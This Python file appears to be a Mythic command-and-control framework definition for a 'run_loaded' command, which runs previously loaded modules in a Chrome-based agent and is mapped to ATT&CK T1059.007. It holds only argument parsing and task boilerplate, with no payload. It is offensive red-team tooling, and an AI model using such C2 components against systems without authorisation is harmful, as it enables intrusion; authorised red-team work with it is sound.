from mythic_container.MythicCommandBase import *


class RunLoadedArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="name",
                type=ParameterType.String,
                description="Loaded command name. Empty lists loaded names.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="args",
                type=ParameterType.String,
                description="JSON arguments for the loaded module",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        pieces = self.command_line.split(maxsplit=1)
        self.add_arg("name", pieces[0])
        if len(pieces) > 1:
            self.add_arg("args", pieces[1])

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class RunLoadedCommand(CommandBase):
    cmd = "run_loaded"
    needs_admin = False
    help_cmd = "run_loaded [name] [args-json]"
    description = "Run a previously loaded sandbox module"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1059.007"]
    argument_class = RunLoadedArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams=taskData.args.get_arg("name") or "list",
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
